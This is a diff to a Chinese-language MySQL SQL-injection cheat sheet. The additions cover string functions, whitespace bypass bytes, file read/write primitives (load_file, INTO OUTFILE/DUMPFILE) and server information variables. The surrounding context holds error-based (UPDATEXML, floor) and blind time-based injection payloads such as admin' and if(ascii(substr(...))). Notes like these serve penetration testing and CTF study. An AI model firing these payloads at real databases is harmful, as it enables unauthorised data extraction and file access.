@@ -1,4 +1,6 @@
+## 常用函数
 ### substr()
+### mid()
 ### if()
 `IF( expr1 , expr2 , expr3 )`
 expr1 的值为 TRUE，则返回值为 expr2   
@@ -11,9 +13,103 @@ expr1 的值为FALSE，则返回值为 expr3
 ### ascii()
 `ASCII ( input_string )`
 `ASCII()`函数接受字符表达式并返回字符表达式最左侧字符的ASCII代码值,`input_string`可以是文字字符，字符串表达式或列。 如果`input_string`有多个字符，则该函数返回其最左侧字符的ASCII代码值
+### char()
+### concat()
+`CONCAT(str1,str2,...)`
+```mysql
+mysql> SELECT CONCAT('My', 'S', 'QL');
+        -> 'MySQL'
+# 任一字符串为NULL结果为NULL
+mysql> SELECT CONCAT('My', NULL, 'QL');
+        -> NULL
+mysql> SELECT CONCAT(14.3);
+        -> '14.3'
+```
+### concat_ws()
+`CONCAT_WS(separator,str1,str2,...)`
+```MYSQL
+mysql> SELECT CONCAT_WS(',','First name','Second name','Last Name');
+        -> 'First name,Second name,Last Name'
+mysql> SELECT CONCAT_WS(',','First name',NULL,'Last Name');
+        -> 'First name,Last Name'
+```
+
+### group_concat()
+合并多条结果
+### json_arrayagg()
+group_concat()的替换
+### greatest()
+返回大的那个参数
+```MYSQL
+mysql> SELECT GREATEST(2,0);
+        -> 2
+mysql> SELECT GREATEST(34.0,3.0,5.0,767.0);
+        -> 767.0
+mysql> SELECT GREATEST('B','A','C');
+        -> 'C'
+```
+
+### expr BETWEEN min AND max
+返回介于min和max间的数字
+```MYSQL
+mysql> SELECT 2 BETWEEN 1 AND 3, 2 BETWEEN 3 and 1;
+        -> 1, 0
+mysql> SELECT 1 BETWEEN 2 AND 3;
+        -> 0
+mysql> SELECT 'b' BETWEEN 'a' AND 'c';
+        -> 1
+mysql> SELECT 2 BETWEEN 2 AND '3';
+        -> 1
+mysql> SELECT 2 BETWEEN 2 AND 'x-3';
+        -> 0
+```
+### 
+## 空白字符
+```
+09
+0a
+0b
+0c
+0d
+a0
+20
+```
+## 文件读写
+### load_file()
+### LOAD DATA INFILE
+```SHELL
+LOAD DATA
+    [LOW_PRIORITY | CONCURRENT] [LOCAL]
+    INFILE 'file_name'
+    [REPLACE | IGNORE]
+    INTO TABLE tbl_name
+    [PARTITION (partition_name [, partition_name] ...)]
+    [CHARACTER SET charset_name]
+    [{FIELDS | COLUMNS}
+        [TERMINATED BY 'string']
+        [[OPTIONALLY] ENCLOSED BY 'char']
+        [ESCAPED BY 'char']
+    ]
+    [LINES
+        [STARTING BY 'string']
+        [TERMINATED BY 'string']
+    ]
+    [IGNORE number {LINES | ROWS}]
+    [(col_name_or_user_var
+        [, col_name_or_user_var] ...)]
+    [SET col_name={expr | DEFAULT},
+        [, col_name={expr | DEFAULT}] ...]
+```
+
+### INTO DUMPFILE
+SELECT ... INTO DUMPFILE
+用binary写入同一行
+### INTO OUTFILE
+SELECT ... INTO OUTFILE
+普通写入（可换行）
 ## 报错注入
 ### floor()
-（8.x>mysql>5.0）[双查询报错注入]。函数返回小于或等于指定值（value）的最小整数,取整
+（8.x>mysql>5.0）双查询报错注入。函数返回小于或等于指定值（value）的最小整数,取整
 `select count(*),(floor(rand(0)*2)) as x from 表名 group by x`
 ```mysql
 # 爆库
@@ -45,6 +141,8 @@ as y)
  AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1)
 ```
 
+### SELECT ~0 + 1
+overflow
 ### EXP(9999)
 MYSQL5.5.5及以上
 EXP()函数用于将E提升为指定数字X的幂，这里E(2.718281 ...)是自然对数的底数。
@@ -135,3 +233,29 @@ admin' and if(ascii(substr((select database()),1,1))>1,(SELECT count(*) FROM inf
 ```mysql
 select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
 ```
+
+## 信息函数
+- @@version
+    - 同 version()
+- user()
+    - current_user
+    - current_user()
+    - SESSION_USER()
+    - SYSTEM_USER()
+    - current user
+- system_user()
+    - database system user
+- database()
+    - schema()
+    - current database
+- @@basedir
+    - MySQL 安裝路徑
+- @@datadir
+    - Location of db file
+- @@plugin_dir
+- @@hostname
+- @@version_compile_os
+    - Operating System
+- @@version_compile_machine
+- @@innodb_version
+- @@global.secure_file_priv
